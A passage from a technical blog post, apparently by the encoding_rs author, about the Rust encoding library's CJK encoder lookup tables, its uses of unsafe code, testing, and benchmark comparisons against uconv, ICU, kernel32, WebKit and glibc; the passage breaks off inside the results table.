</p><p>The effort to reduce the binary size was successful in the sense that the binary size of Firefox was reduced when encoding_rs replaced uconv, even though encoding_rs added new functionality to support decoding directly to UTF-8 and encoding directly from UTF-8.

</p><h4>Optional Encode-Oriented Tables for Multi-Byte Encodings</h4>

<p>In the case of Hangul  syllables when encoding to EUC-KR even the original  unextended KS X 1001 part of the mapping table is in the Unicode order due to KS X 1001 and Unicode agreeing on how the syllables should be sorted. This enables the use of binary search  when encoding Hangul into EUC-KR without encode-specific lookup tables.

</p><p>However,  with the exception of gbk extension part that was not in original GB2312, the way the CJK Unified Ideographs have been laid out in the legacy standards has no obvious correspondence to Unicode order. As far as I‚Äôm aware, the options are doing a linear search over the decode-oriented data tables or introducing additional encode-oriented data tables. The <i>relative</i> performance difference between these two approaches is, obviously, dramatic.

</p><p>Even though testing indicated that linear search over the decode-oriented data tables yielded acceptable human-perceived performance for the <i>browser-relevant use cases</i> even on phone-like hardware, I wanted to have a backup plan in case  my determination  of the human-perceived performance was wrong and users ended up complaining. Still,  I tried to come up with a backup plan that would reach uconv  performance  (which already wasn‚Äôt as fast as as an implementation willing to spend memory on encode-specific tables could be) without having to add lookup tables as large as the obviously fast solution of having a table large enough to index by the offset to the CJK Unified Ideographs block would require.

</p><p>Ideographs appear to be practically unused in modern Korean online writing, so accelerating Hanja to EUC-KR   encode wasn‚Äôt important. On the other hand, GB2312, original Big5 (without the HKSCS parts) and JIS X 0208 all have the ideographs organized into two ranges: Level 1 and Level 2, where Level 1 contains the more frequently used ideographs. As the backup plan, I developed compile-time-optional encode acceleration of the Level 1 areas of these three mapping tables.

</p><p>Since this was a mere backup plan, instead of researching better data structures for the problem, I went with the most obvious one: For each of the three legacy standards, an array of the level Level 1 Hanzi/Kanji sorted in the Unicode order and another array of the same length sorted in the corresponding order containing arrays of two bytes already encoded in the target encoding. In the case of JIS X 0208, there are three target encodings, so I used the most common one, Shift_JIS, for the bytes and added functions to transform the bytes to EUC-JP and ISO-2022-JP.

</p><p>This solution was enough to make encode to the legacy CJK encodings many times faster than uconv. The backup plan, however, didn‚Äôt end up needing to ship in Firefox. Linear search seems to be fast enough, considering that users didn‚Äôt complain. Indeed, a linear search-based Big5 encoder had already been shipped in Firefox 43 without complaints from users. (However, this, in itself, wasn‚Äôt a sufficient data point on its own, since, anecdotally, it seems that the migration from Big5 to UTF-8 on the Web is further along than the migration from Shift_JIS and gbk.)

</p><p>Even though impressive relative to uconv performance, accelerating Level 1 Hanzi/Kanji encode using binary search remained very slow <i>relative</i> to other encoding conversion libraries. In order to remove the perception that encoding_rs is very slow for some use cases, I implemented a compile-time option to use encode-only lookup tables that are large enough to index into directly by the offset into the Hangul Syllables or CJK Unified Ideographs Unicode blocks. With these options enabled, encoding_rs legacy CJK encoder performance is within an order of magnitude from ICU and kernel32.dll though still generally not exceeding their performance for plain text (that doesn‚Äôt have a lot of ASCII markup). Presumably, to match or exceed their performance, encoding_rs would need to use even larger lookup tables directly indexable by Basic Multilingual Plane code point and to have even fewer branches. It is worth noting, though, that while even larger lookup tables might win micro-benchmarks, they might have adverse effects on <i>other code</i> in real application workloads by causing more data to be evicted from caches during the encoding process.

</p><p>In general, a library that seeks high encoder performance should probably take the advice given in the Unicode Standard and use an array of 256 pointers indexed by the high half of the Basic Multilingual Plane code point where each pointer either points to an array of 256 pre-encoded byte pairs indexed by the lower half of the Basic Multilingual plane code point or is a null pointer if all possible low bit combinations are unmapped.

</p><p>Still, considering that a Web browser gets away with <i>relatively</i> slow legacy encoders, chances are that many other applications do, too. In general, applications should use UTF-8 for interchange and, therefore, not use the legacy encoders except where <i>truly</i> needed for backward compatibility. Chances are that most applications won‚Äôt need to use the compile-time options to enhance encoder performance and if they do, it‚Äôs probably more about getting the performance on a level where untrusted input can‚Äôt exercise excessively slow code paths rather than about maximal imaginable performance being essential. At this point, it doesn‚Äôt make sense to introduce compile options that would deviate more from the Firefox-relevant code structure for the sake of winning legacy encoder benchmarks.

</p><h4>Safety</h4>

<p>One generally expects Rust code to be safe. Rust code that doesn‚Äôt use <code>unsafe</code> is obviously safe. Rust code that uses <code>unsafe</code> is safe only if <code>unsafe</code> has been used correctly. Semi-alarmingly, encoding_rs uses <code>unsafe</code> quite a bit.

</p><p>Still, <code>unsafe</code> isn‚Äôt used isn‚Äôt used in random ways. Instead, it‚Äôs for certain things and only in certain source files. In particular, it is not used inside the source files that implement the logic for legacy CJK encodings, which in the C++ implementation would be the riskiest area in terms of memory-safety bugs. This is not to say that all the <code>unsafe</code> is appropriate. Some of it would be avoidable right now, but the better way either didn‚Äôt exist or didn‚Äôt exist outside nightly Rust when I wrote the code, and some will likely become avoidable in the future.

</p><p>Here‚Äôs an overview of the kinds of <code>unsafe</code> in encoding_rs:

</p><h5>Unchecked conversion of <code>u32</code> to <code>char</code></h5>

<p>A couple of internal APIs use <code>char</code> to signify Unicode scalar value. However, the scalar value gets computed in a way that first yields the value as <code>u32</code>. Since the value is in the right range by construction, it is reinterpreted as <code>char</code> without the cost of the range check. Some of this use of <code>unsafe</code> could be avoided by using <code>u32</code> instead of <code>char</code> internally in some places. It‚Äôs unclear if the current usage is worthwhile.

</p><h5>Writing to <code>&amp;mut str</code> as <code>&amp;mut [u8]</code></h5>

<p>Since dealing with character encodings is in the core competence of encoding_rs, it would be silly to run the standard library‚Äôs UTF-8 validation on encoding_rs‚Äôs UTF-8 output. Instead, encoding_rs  uses <code>unsafe</code> to assert  the validity of its  UTF-8 output to the type system. It doesn‚Äôt make sense to try to get rid of  this use of  <code>unsafe</code>. It‚Äôs fundamental to the crate.

</p><h5>Calling Intrinsics</h5>

<p>Rust makes intrinsics categorically <code>unsafe</code> even in cases where there isn‚Äôt actually anything that logically requires a given intrinsic to be <code>unsafe</code>. This results in the use of <code>unsafe</code> to call vendor-specific SIMD operations and to annotate <code>if</code> conditions for branch prediction using <code>likely</code>/<code>unlikely</code>. This kind of <code>unsafe</code> makes the code look harder to read and scarier than it actually is, but it is easy to convince oneself that this kind of <code>unsafe</code> is not risky in terms of the overall safety of the crate.

</p><h5>SIMD Bitcasts</h5>

<p>When working with SIMD, it is necessary to convert between different lane configurations in a way that is just a type-system-level operation and on the machine level is nothing: the register is the same and the operations determine how the contents of the register are interpreted. As a consequence, reinterpreting a SIMD type of a given width in bits (always 128 bits in encoding_rs) as another SIMD type of the same width in bits should be OK if both types have integer lanes (i.e. all bit patterns are valid). I expect that in the future, Rust will gain safe wrappers for performing these reinterpretations. Such wrappers already exist behind a feature flag in the <code>packed_simd</code> crate.

</p><h5>Re-Interpreting Slices as Sequences of Different Types</h5>

<p>The ASCII acceleration code reads and writes slices of <code>u8</code> and <code>u16</code> as <code>usize</code> (if SIMD isn‚Äôt enabled) or <code>u8x16</code> and <code>u16x8</code> (if SIMD is enabled). This is done by casting pointers and by dereferencing pointers. This, obviously, is not ideal in terms of confidence in the correctness of the code. Indeed, this kind of code in the <code>mem</code> module had a bug that made to a crates.io release of encoding_rs, though I believe no one actually deployed that code to end users before the problem is remedied.

</p><p>While, based in fuzzing, I believe this code to be to correct, potentially in the future it could be more obviously correct by using <code>align_to</code>(<code>_mut</code>) on primitive slices (stabilized in Rust 1.30.0) and <code>from_slice_aligned</code>/<code>from_slice_aligned</code> and, possibly, their <code>_unchecked</code> variants on SIMD types in the <code>packed_simd</code> crate. However, some of these, notably <code>align_to</code>, are themselves <code>unsafe</code>, even though <code>align_to</code> wouldn‚Äôt  need to be <code>unsafe</code> when both slice item types allow all bit patterns as their value space as primitive integers and integer-lane SIMD vectors do.

</p><h5>Unaligned Memory Access</h5>

<p>Especially with SIMD but also with UTF-16LE and UTF-16BE, unaligned memory access is done with <code>unsafe</code> and <code>std::ptr::copy_nonoverlapping</code> which LLVM optimizes the same way as C‚Äôs <code>memcpy</code> idioms.

</p><h5><code>memcpy</code></h5>

<p>In some cases, data is copied from a slice to another using <code>std::ptr::copy_non_overlapping</code> even when <code>copy_from_slice</code> on primitive slice would do and the bound check wouldn‚Äôt be too much of a performance problem. Removing remaining cases like this would not remove the <code>unsafe</code> that they are in, because they are right next to setting the logical length of  <code>Vec</code> in a way that exposes uninitialized memory. Since the length is set right there anyway, it doesn‚Äôt make much sense to worry about passing the wrong length to <code>std::ptr::copy_non_overlapping</code>.

</p><h5>Avoiding Bound Checks</h5>

<p>Perhaps the most frustrating use of <code>unsafe</code> is to omit bound checks on slice access that the compiler logically should be able to omit from safe code <a href="https://github.com/rust-lang/rust/issues/55147">but doesn‚Äôt</a>. I hope that in the future, LLVM gets taught more about optimizing away unnecessary bound checks in the kind of IR that rustc emits. At present, it might be possible to write the code differently without <code>unsafe</code> such that the resulting IR would match the kind of patterns that LLVM knows how to optimize. It is not a nice programming experience, though, to try different logically equivalent ways of expressing the code and seeing what kind of assembly comes out of the compiler.

</p><p>Additionally, there are cases where an array of 128 items is accessed with a byte minus 128 after the bytes is known to have its highest bit set. This can‚Äôt be expected to be known to the optimizer in cases where the fact that the highest bit is set has been established using vendor-specific SIMD.

</p><h3>Testing</h3>

<p>In the opening paragraph, I claimed high correctness. encoding_rs has been tested in various ways. There are small manually-written tests in the Rust source files for edge cases that seemed interesting. Additionally, every index item for every lookup table-based encoding is tested by generating the expectations from the data provided along via different code than the main implementation. In the context of Firefox, encoding_rs is tested using the test cases in Web Platform Tests (WPT). All <a href="https://wpt.fyi/results/encoding?label=experimental">encoding tests in WPT pass</a>, except tests that test for the new <code>TextDecoderStream</code> and <code>TextEncoderStream</code> JavaScript APIs.

</p><p>Additionally, encoding_rs is fuzzed using <a href="https://github.com/rust-fuzz/cargo-fuzz">cargo-fuzz</a>, which wraps LLVM‚Äôs coverage-guided libFuzzer for use on Rust code.

</p><h3>Benchmarking</h3>

<p>Let‚Äôs finally take a look at how encoding_rs performs compared to other libraries.

</p><h4>Workloads</h4>

<p>When decoding from UTF-8, the <a href="https://github.com/hsivonen/encoding_bench/tree/master/src/wikipedia">test case</a> is the Wikipedia article for <a href="https://en.wikipedia.org/wiki/Mars">Mars, the planet</a>, for the language in question <i>in HTML</i>. </p><p>Reasons for choosing Wikipedia were:</p>

<ul>
<li>Wikipedia is an actual top site that‚Äôs relevant to users.</li>
<li>Wikipedia has content in all the languages that were relevant for testing.</li>
<li>Wikipedia content is human-authored (though I gather that the Simplified Chinese text not directly human-authored but is programmatically derived from human-authored Traditional Chinese text).</li>
<li>Wikipedia content is suitably licensed.</li>
</ul>

<p>The topic Mars, the planet, was chosen, because it is the most-featured topic
across the different-language Wikipedias and, indeed, had non-trivial articles
in all the languages needed. Trying to choose a typical-length article for each
language separately wasn‚Äôt feasible in the Wikidata data set.</p>

<p>The languages were chosen to represent the languages that have Web-relevant legacy encodings. In the case of windows-1252, multiple languages with different non-ASCII frequencies were used. The main shortcoming of this kind of selection is that UTF-8 is not tested with a (South Asian) language that would use three bytes per character in UTF-8 with ASCII spaces and would have more characters per typical word than Korean has.

</p><p>When decoding from a non-UTF-8 encoding, the test case is synthetized from the UTF-8 test case by converting the Wikipedia article to the encoding in question and replacing unmappable characters with numeric character references (and in the case of Big5 removing a couple of characters that glibc couldn‚Äôt deal with).</p>

<p>When testing x-user-defined decode, the test case is a JPEG image, because loading binary data over XHR is the main performance-sensitive use case for x-user-defined.</p>

<p>The JavaScript case represents 100% ASCII and is a minified version of jQuery. (Wikipedia English isn‚Äôt 100% ASCII.) The numbers for uconv are missing, because the benchmark was added to the set after the builds made for uconv testing had rotted and were no longer linkable due to changes in the system C++ standard library.</p>

<p>Vietnamese windows-1258 workloads are excluded, because windows-1258 uses combining characters in an unusual way, so a na√Øve synthetization of windows-1258 test data from precomposed UTF-8 content would not have represented a real workload.

</p><p>The encoder work loads use <i>plain text</i> extracts from the decoder test cases in order to simulate form submission (<code>textarea</code>) workloads. <i>That is, the encoder benchmarks do not test ASCII runs of HTML markup, because that scenario isn‚Äôt relevant to Web-exposed browser features.</i></p>

<p>The other Web-relevant case for the encoders is the parsing of URL query strings. In the absence of errors, the query strings are ASCII.</p>

<h4>Reference Libraries</h4>

<p>Obviously, uconv is benchmarked to understand performance relative to what Gecko had before. rust-encoding is benchmarked to understand performance relative to what was already available in the Rust ecosystem.

</p><p>ICU and WebKit are benchmarked to understand performance relative to other browsers. WebKit uses its own character encoding converters for UTF-8, UTF-16LE, UTF-16BE, x-user-defined, replacement, and windows-1252 and uses ICU for the others. Chrome inherits this approach from WebKit but has changed the error handling for UTF-8 to be spec-compliant and carries substantial patches to ICU for Encoding Standard compliance. WebKit internals were easier to make available to the benchmark harness, so only WebKit is benchmarked.

</p><p>WebKit‚Äôs windows-1252 is not benchmarked, because trying to use it segfaulted and it wasn‚Äôt worthwhile to debug the failure. WebKit on macOS is built with clang, of course, but hopefully building with GCC gives a general idea.

</p><p>ICU is benchmarked as shipped in Ubuntu, but hopefully that‚Äôs close enough performance-wise to the copies of ICU used by Safari and Chrome.

</p><p>kernel32.dll and glibc represent system APIs. I believe Core Foundation on Mac uses ICU internally, so in that sense ICU also represents a system API. I have no idea if the converters in kernel32.dll are performance-wise representative of what Edge and IE use. (kernel32.dll provides only a non-streaming API publicly while Edge and IE clearly need streaming converters.)</p>

<p>Bob Steagall‚Äôs UTF-8 to UTF-16 decoder is benchmarked, because an entire talk claiming excellent results was recently dedicated to it at CppCon and it indeed turned out to be exceptional in its speed for non-ASCII input.</p>

<h4>Apples to Oranges Comparisons</h4>

<p>Some the comparisons could be considered to compare things that aren‚Äôt commensurable. In particular:</p>

<ul>
<li><p>Except for kernel32, the measurements exclude the initialization and destruction of the converter. This is to the advantage of uconv, ICU and glibc, which perform more work during converter initialization than encoding_rs does. kernel32 does not expose converter initialization is a distinct operation and it‚Äôs not clear if there is an initialization cost the first time a given converter is used or every time.</p></li>
<li><p>When converting to and from UTF-8, in the comparison with rust-encoding, rust-encoding targets <code>String</code> and <code>Vec&lt;u8&gt;</code> while encoding_rs uses <code>Cow</code>s. In this case, instead of trying to make the comparison fair by making encoding_rs make a useless copy, the comparison demonstrates the benefits of conditionally copy-free Rust  API design.</p></li>
<li><p>The WebKit API shows traces of Qt‚Äôs converter design. This includes always allocating a buffer on the heap for output. As a result, the WebKit numbers include the allocation and deallocation of the output buffer but those numbers are compared with encoding_rs numbers that don‚Äôt include buffer allocation and deallocation.
</p></li><li><p>Since a reference libraries do not fully conform to the Encoding Standard,  the work being performed isn‚Äôt exactly the same. Instead, the closest approximation of a given legacy encoding is used. Even the error handling can differ: WebKit‚Äôs UTF-16BE and UTF-16LE converters don‚Äôt check for unpaired surrogates and kernel32 shows unpolished behavior on errors.</p></li>
<li><p>Arguably, UTF-8 isn‚Äôt the native application-side Unicode representation of glibc. However, since e.g. glib (the infrastructure library used by GTK+) uses UTF-8 as its native application-side Unicode representation and wraps glibc for the conversions from external encodings, testing glibc‚Äôs performance to and from UTF-8 is relevant to how glibc is used even if arguably unfair.</p></li>
<li><p>When encoding from UTF-8, encoding_rs and rust-encoding assume the input is valid, but glibc does not.</p></li>
</ul>

<h4>Reading the Tables</h4>

<p>The columns are grouped into decode results and into encode results. Those groups, in turn, are grouped into using UTF-16 as the internal Unicode representation and into using UTF-8 as the internal Unicode representation. Both cases are supported by encoding_rs but the libraries being compared with support one or the other. Then there is a column for each library whose performance is being compared with.

</p><ul>
	<li>uconv is Gecko‚Äôs old encoding converter library with the numbers run in November 2016 on Ubuntu 16.04 with Ubuntu-provided GCC and before Spectre/Meltdown kernel mitigations. It would be fair to recompile with current clang, but I deemed it too much effort to get 2016 Gecko building on a 2018 system.
	</li><li>ICU is <a href="http://site.icu-project.org/">ICU</a> 60 as shipped on Ubuntu 18.04.
	</li><li>kernel32 is <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/dd319072(v=vs.85).aspx">kernel32.dll</a> included in Windows 10 1803.
	</li><li>WebKit is WebKitGTK+ 2.22.2 built with the default options (<code>-O2</code>) with GCC 7.3.0 on Ubuntu 18.04.
	</li><li>kewb is <a href="https://github.com/BobSteagall/CppNow2018/tree/master/FastConversionFromUTF-8/code/src">Bob Steagall‚Äôs SSE2-accelerated converter</a> <a href="https://www.youtube.com/watch?v=5FQ87-Ecb-A">presented at CppCon2018</a> built with clang at <code>-O3</code>.
	</li><li>stdlib is Rust‚Äôs standard library.
	</li><li>rust-encoding is <a href="https://github.com/lifthrasiir/rust-encoding">rust-encoding</a> 0.2.33.
	</li><li>glibc is glibc‚Äôs iconv as shipped on Ubuntu 18.04.
</li></ul>

<p>Each row names a language and an external encoding to convert from or to. The numbers are encoding_rs speed factors relative to the library named in the column. <span>2.0</span> means that encoding_rs is twice as fast as the reference library named in the column header. <span>0.5</span> means that the reference library named in the column header is twice as fast as encoding_rs. <span>0.00</span> means that encoding_rs is <i>relatively</i> very slow (still user-perceptibly fast enough for the form submission use case in a browser) and the non-zero decimals didn‚Äôt show up in the second decimal position.</p>

<h4>Benchmark Results</h4>

<p>encoding_rs and rust-encoding are built with Rust‚Äôs default optimization level <code>opt_level=3</code> even though encoding_rs in Firefox is built at <code>opt_level=2</code> for the time being. encoding_rs in Firefox is expected to switch to <code>opt_level=3</code> soon. For these benchmarks, at least on x86_64 Haswell, there is no practical difference between <code>opt_level=2</code> and <code>opt_level=3</code> being applied to encoding_rs. However, previously there have been issues with <code>opt_level=2</code> that I would rather not have investigated, so I am really looking forward to using <code>opt_level=3</code> in the Gecko context. Also kewb is built at <code>-O3</code>. The Rust version was 1.32.0-nightly (9fefb6766 2018-11-13).

</p><p>In all cases, the default rustc optimization target for a given instruction set architecture was used. That is, e.g. the Haswell numbers mean running the code compiled for the generic x86_64 target on a Haswell chip and do not mean asking the compiler to optimize for Haswell specifically.

</p><h5>x86_64 Intel Core i7-4770 @ 3.40 GHz (Haswell, desktop)</h5>

<p>encoding_rs uses SSE2 explicitly. Since SSE2 is part of the x86_64 baseline instruction set, other software is eligible for SSE2 autovectorization or to enable explicit SSE2 parts if they have them. At least uconv had an explicit SSE2 code path for ASCII in the UTF-8 to UTF-16 decoder.

</p><table>
<thead>
<tr><td rowspan="3"></td><th colspan="8">Decode</th><th colspan="6">Encode</th></tr>
<tr><th colspan="5">UTF-16</th><th colspan="3">UTF-8</th><th colspan="4">UTF-16</th><th colspan="2">UTF-8</th></tr>
<tr>
<th>
uconv</th>
<th>
ICU</th>
<th>
kernel32</th>
<th>
WebKit</th>
<th>
kewb</th>
<th>
stdlib</th>
<th>
rust-encoding</th>
<th>
glibc</th>
<th>
uconv</th>
<th>
ICU</th>
<th>
kernel32</th>
<th>
WebKit</th>
<th>
rust-encoding</th>
<th>
glibc</th>
</tr>
</thead><tbody>
<tr>
<th>
Arabic, UTF-8</th>
<td>2.47</td>
<td>2.68</td>
<td>1.26</td>
<td>1.77</td>
<td>0.98</td>
<td>1.37</td>
<td>4.68</td>
<td>5.73</td>
<td>0.85</td>
<td>0.85</td>
<td>0.75</td>
<td>1.15</td>
<td>4024.12</td>
<td>110.89</td>
</tr>
<tr>
<th>
Czech, UTF-8</th>
<td>2.55</td>
<td>2.84</td>
<td>1.57</td>
<td>1.78</td>
<td>0.67</td>
<td>2.01</td>
<td>9.96</td>
<td>10.60</td>
<td>1.04</td>
<td>1.23</td>
<td>0.93</td>
<td>1.42</td>
<td>9055.00</td>
<td>104.12</td>
</tr>
<tr>
<th>
German, UTF-8</th>
<td>3.36</td>
<td>5.95</td>
<td>2.77</td>
<td>2.90</td>
<td>1.03</td>
<td>2.14</td>
<td>22.60</td>
<td>19.19</td>
<td>3.43</td>
<td>4.14</td>
<td>1.71</td>
<td>5.10</td>
<td>3469.75</td>
<td>73.62</td>
</tr>
<tr>
<th>
Greek, UTF-8</th>
<td>2.52</td>
<td>2.96</td>
<td>1.37</td>
<td>1.88</td>
<td>1.01</td>
<td>1.38</td>
<td>5.72</td>
<td>6.80</td>
<td>0.86</td>
<td>0.90</td>
<td>0.77</td>
<td>1.15</td>
<td>5492.50</td>
<td>105.05</td>
</tr>
<tr>
<th>
English, UTF-8</th>
<td>2.79</td>
<td>8.57</td>
<td>3.65</td>
<td>3.66</td>
<td>1.14</td>
<td>1.82</td>
<td>61.74</td>
<td>31.99</td>
<td>7.46</td>
<td>11.07</td>
<td>3.76</td>
<td>14.20</td>
<td>632.38</td>
<td>69.89</td>
</tr>
<tr>
<th>
JavaScript, UTF-8</th>
<td></td>
<td>11.42</td>
<td>4.77</td>
<td>0.81</td>
<td>1.05</td>
<td>1.58</td>
<td>30.02</td>
<td>45.80</td>
<td></td>
<td>13.84</td>
<td>5.20</td>
<td>17.84</td>
<td>682.12</td>
<td>63.83</td>
</tr>
<tr>
<th>
French, UTF-8</th>
<td>2.82</td>
<td>4.20</td>
<td>2.06</td>
<td>2.16</td>
<td>0.77</td>
<td>1.80</td>
<td>14.54</td>
<td>13.80</td>
<td>1.25</td>
<td>1.54</td>
<td>0.87</td>
<td>1.84</td>
<td>14217.50</td>
<td>80.27</td>
</tr>
<tr>
<th>
Hebrew, UTF-8</th>
<td>2.45</td>
<td>2.50</td>
<td>1.26</td>
<td>1.71</td>
<td>0.93</td>
<td>1.47</td>
<td>4.67</td>
<td>5.78</td>
<td>0.81</td>
<td>0.87</td>
<td>0.72</td>
<td>1.04</td>
<td>9654.38</td>
<td>113.19</td>
</tr>
<tr>
<th>
Portuguese, UTF-8</th>
<td>2.94</td>
<td>4.91</td>
<td>2.33</td>
<td>2.44</td>
<td>0.86</td>
<td>1.85</td>
<td>17.65</td>
<td>15.90</td>
<td>1.89</td>
<td>2.30</td>
<td>1.06</td>
<td>2.77</td>
<td>5188.50</td>
<td>79.98</td>
</tr>
<tr>
<th>
Russian, UTF-8</th>
<td>2.46</td>
<td>2.73</td>
<td>1.29</td>
<td>1.81</td>
<td>0.96</td>
<td>1.41</td>
<td>5.07</td>
<td>6.11</td>
<td>0.81</td>
<td>0.90</td>
<td>0.75</td>
<td>1.02</td>
<td>21188.00</td>
<td>109.55</td>
</tr>
<tr>
<th>
Thai, UTF-8</th>
<td>3.11</td>
<td>3.99</td>
<td>1.67</td>
<td>2.06</td>
<td>1.18</td>
<td>1.59</td>
<td>10.15</td>
<td>10.38</td>
<td>1.09</td>
<td>1.47</td>
<td>1.06</td>
<td>1.41</td>
<td>16414.75</td>
<td>68.88</td>
</tr>
<tr>
<th>
Turkish, UTF-8</th>
<td>2.47</td>
<td>2.53</td>
<td>1.47</td>
<td>1.70</td>
<td>0.67</td>
<td>2.04</td>
<td>8.93</td>
<td>9.74</td>
<td>1.01</td>
<td>1.19</td>
<td>0.89</td>
<td>1.35</td>
<td>10995.38</td>
<td>104.52</td>
</tr>
<tr>
<th>
Vietnamese, UTF-8</th>
<td>2.37</td>
<td>2.31</td>
<td>1.31</td>
<td>1.63</td>
<td>0.78</td>
<td>1.90</td>
<td>6.62</td>
<td>7.58</td>
<td>0.90</td>
<td>1.01</td>
<td>0.84</td>
<td>1.08</td>
<td>27145.50</td>
<td>145.72</td>
</tr>
<tr>
<th>
Simplified Chinese, UTF-8</th>
<td>3.02</td>
<td>3.40</td>
<td>1.67</td>
<td>1.96</td>
<td>1.06</td>
<td>1.90</td>
<td>8.93</td>
<td>9.49</td>
<td>1.15</td>
<td>1.58</td>
<td>1.03</td>
<td>1.55</td>
<td>3575.00</td>
<td>75.42</td>
</tr>
<tr>
<th>
Traditional Chinese, UTF-8</th>
<td>3.05</td>
<td>3.42</td>
<td>1.68</td>
<td>1.96</td>
<td>1.07</td>
<td>1.90</td>
<td>8.98</td>
<td>9.54</td>
<td>1.15</td>
<td>1.58</td>
<td>1.03</td>
<td>1.55</td>
<td>3600.25</td>
<td>74.89</td>
</tr>
<tr>
<th>
Japanese, UTF-8</th>
<td>3.26</td>
<td>3.47</td>
<td>1.66</td>
<td>1.99</td>
<td>1.15</td>
<td>1.94</td>
<td>8.40</td>
<td>9.20</td>
<td>1.14</td>
<td>1.60</td>
<td>1.07</td>
<td>1.56</td>
<td>2880.12</td>
<td>71.67</td>
</tr>
<tr>
<th>
Korean, UTF-8</th>
<td>2.98</td>
<td>2.85</td>
<td>1.54</td>
<td>1.89</td>
<td>1.01</td>
<td>1.90</td>
<td>6.48</td>
<td>7.56</td>
<td>1.10</td>
<td>1.39</td>
<td>0.89</td>
<td>1.33</td>
<td>3929.12</td>
<td>108.69</td>
</tr>
<tr>
<th>
Arabic, windows-1256</th>
<td>1.62</td>
<td>1.12</td>
<td>0.82</td>
<td></td>
<td></td>
<td></td>
<td>5.15</td>
<td>4.03</td>
<td>3.27</td>
<td>0.37</td>
<td>0.05</td>
<td></td>
<td>0.72</td>
<td>0.86</td>
</tr>
<tr>
<th>
Czech, windows-1250</th>
<td>2.49</td>
<td>1.71</td>
<td>1.25</td>
<td></td>
<td></td>
<td></td>
<td>7.87</td>
<td>7.00</td>
<td>2.71</td>
<td>0.65</td>
<td>0.12</td>
<td></td>
<td>1.01</td>
<td>1.12</td>
</tr>
<tr>
<th>
German, windows-1252</th>
<td>7.25</td>
<td>4.99</td>
<td>3.66</td>
<td></td>
<td></td>
<td></td>
<td>25.07</td>
<td>22.76</td>
<td>32.31</td>
<td>6.82</td>
<td>1.64</td>
<td></td>
<td>12.89</td>
<td>12.02</td>
</tr>
<tr>
<th>
Greek, windows-1253</th>
<td>2.12</td>
<td>1.46</td>
<td>1.07</td>
<td></td>
<td></td>
<td></td>
<td>6.36</td>
<td>5.01</td>
<td>7.03</td>
<td>1.43</td>
<td>0.20</td>
<td></td>
<td>2.06</td>
<td>2.00</td>
</tr>
<tr>
<th>
English, windows-1252</th>
<td>9.96</td>
<td>6.85</td>
<td>5.02</td>
<td></td>
<td></td>
<td></td>
<td>47.65</td>
<td>43.28</td>
<td>96.70</td>
<td>20.12</td>
<td>5.10</td>
<td></td>
<td>58.56</td>
<td>55.80</td>
</tr>
<tr>
<th>
French, windows-1252</th>
<td>4.29</td>
<td>2.95</td>
<td>2.16</td>
<td></td>
<td></td>
<td></td>
<td>13.91</td>
<td>12.51</td>
<td>10.67</td>
<td>2.33</td>
<td>0.53</td>
<td></td>
<td>4.24</td>
<td>4.04</td>
</tr>
<tr>
<th>
Hebrew, windows-1255</th>
<td>1.96</td>
<td>1.07</td>
<td>0.78</td>
<td></td>
<td></td>
<td></td>
<td>5.19</td>
<td>4.88</td>
<td>7.05</td>
<td>1.34</td>
<td>0.18</td>
<td></td>
<td>1.98</td>
<td>1.78</td>
</tr>
<tr>
<th>
Portuguese, windows-1252</th>
<td>5.46</td>
<td>3.75</td>
<td>2.75</td>
<td></td>
<td></td>
<td></td>
<td>18.32</td>
<td>16.51</td>
<td>17.36</td>
<td>3.78</td>
<td>0.87</td>
<td></td>
<td>6.53</td>
<td>6.14</td>
</tr>
<tr>
<th>
Russian, windows-1251</th>
<td>1.63</td>
<td>1.12</td>
<td>0.82</td>
<td></td>
<td></td>
<td></td>
<td>5.21</td>
<td>4.00</td>
<td>4.97</td>
<td>1.36</td>
<td>0.19</td>
<td></td>
<td>2.04</td>
<td>1.91</td>
</tr>
<tr>
<th>
Thai, windows-874</th>
<td>3.36</td>
<td>2.31</td>
<td>1.69</td>
<td></td>
<td></td>
<td></td>
<td>5.83</td>
<td>4.70</td>
<td>3.99</td>
<td>0.59</td>
<td>0.10</td>
<td></td>
<td>1.18</td>
<td>1.03</td>
</tr>
<tr>
<th>
Turkish, windows-1254</th>
<td>2.28</td>
<td>1.57</td>
<td>1.15</td>
<td></td>
<td></td>
<td></td>
<td>7.02</td>
<td>6.21</td>
<td>4.61</td>
<td>0.84</td>
<td>0.16</td>
<td></td>
<td>1.32</td>
<td>1.48</td>
</tr>
<tr>
<th>
Simplified Chinese, gb18030</th>
<td>3.68</td>
<td>3.64</td>
<td>5.04</td>
<td></td>
<td></td>
<td></td>
<td>6.40</td>
<td>4.73</td>
<td>0.23</td>
<td>0.01</td>
<td>0.02</td>
<td></td>
<td>0.01</td>
<td>0.01</td>
</tr>
<tr>
<th>
Traditional Chinese, Big5</th>
<td>3.24</td>
<td>3.08</td>
<td>1.87</td>
<td></td>
<td></td>
<td></td>
<td>6.13</td>
<td>4.36</td>
<td>1.29</td>
<td>0.01</td>
<td>0.00</td>
<td></td>
<td>0.01</td>
<td>0.02</td>
</tr>
<tr>
<th>
Japanese, EUC-JP</th>
<td>2.85</td>
<td>2.79</td>
<td>1.69</td>
<td></td>
<td></td>
<td></td>
<td>5.17</td>
<td>3.78</td>
<td>1.26</td>
<td>0.02</td>
<td>0.01</td>
<td></td>
<td>0.03</td>
<td>0.17</td>
</tr>
<tr>
<th>
Japanese, ISO-2022-JP</th>
<td>0.94</td>
<td>1.80</td>
<td>1.07</td>
<td></td>
<td></td>
<td></td>
<td>2.91</td>
<td>2.10</td>
<td>0.61</td>
<td>0.06</td>
<td>0.06</td>
<td></td>
<td>0.03</td>
<td>0.15</td>
</tr>
<tr>
<th>
Japanese, Shift_JIS</th>
<td>1.72</td>
<td>2.35</td>
<td>1.42</td>
<td></td>
<td></td>
<td></td>
<td>4.66</td>
<td>3.41</td>
<td>0.62</td>
<td>0.01</td>
<td>0.01</td>
<td></td>
<td>0.03</td>
<td>0.03</td>
</tr>
<tr>
<th>
Korean, EUC-KR</th>
<td>39.64</td>
<td>3.47</td>
<td>2.24</td>
<td></td>
<td></td>
<td></td>
<td>5.81</td>
<td>4.08</td>
<td>84.85</td>
<td>0.31</td>
<td>0.20</td>
<td></td>
<td>0.56</td>
<td>0.53</td>
</tr>
<tr>
<th>
x-user-defined</th>
<td>12.87</td>
<td></td>
<td></td>
<td>25.29</td>
<td></td>
<td></td>
<td>3.03</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Arabic, UTF-16LE</th>
<td>13.48</td>
<td>6.33</td>
<td></td>
<td>4.17</td>
